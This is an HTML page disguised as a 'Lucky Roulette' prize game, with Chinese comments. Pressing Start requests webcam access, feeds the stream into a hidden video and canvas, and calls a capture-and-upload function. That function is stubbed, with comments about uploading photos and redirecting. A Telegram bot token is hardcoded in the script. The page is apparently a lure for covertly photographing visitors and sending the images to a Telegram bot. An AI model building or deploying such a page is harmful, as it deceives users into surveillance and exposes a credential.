<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎁Lucky Roulette🎁</title>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; background-color: #1a1a1a; color: white; font-family: sans-serif;
        }
        /* 转盘容器 */
        #wheel-container { position: relative; width: 300px; height: 300px; margin-bottom: 30px; }
        #wheel { width: 100%; height: 100%; }
        /* 指针样式 - 绝对定位在容器中心 */
        #pointer { 
            position: absolute; top: 10%; left: 47%; width: 6%; height: 40%; 
            background: red; border-radius: 5px; transform-origin: bottom center;
            transition: transform 0.5s ease-out;
        }
        /* 指针旋转动画 */
        .spinning { animation: rotatePointer 0.5s linear infinite; }
        @keyframes rotatePointer { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; }
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 50px; background: #d9534f; border: none; color: white; }
    </style>
</head>
<body>
    <div id="wheel-container">
        <img id="wheel" src="https://github.com/sachinbagwan208-design/-/raw/main/00.png" alt="转盘">
        <div id="pointer"></div>
    </div>
    
    <div id="status">点击抽奖</div>
    <button id="startBtn">Start🎲</button>
    
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
        const pointer = document.getElementById('pointer');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        
        startBtn.addEventListener('click', async () => {
            pointer.classList.add('spinning');
            startBtn.style.display = 'none';
            status.innerText = "A lucky draw is underway🎲...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // 模拟抽奖时长
                setTimeout(async () => {
                    pointer.classList.remove('spinning');
                    // 让指针指向某个角度（例如旋转到 270 度）
                    pointer.style.transform = "rotate(270deg)";
                    captureAndUpload(stream);
                }, 2000);
            } catch (err) {
                status.innerText = "请允许摄像头权限";
            }
        });

        function captureAndUpload(stream) {
            // ... 保持之前的拍照及上传逻辑 ...
            // 上传成功后调用：stream.getTracks().forEach(t => t.stop()); window.location.href = "视频链接";
        }
    </script>
</body>
</html>
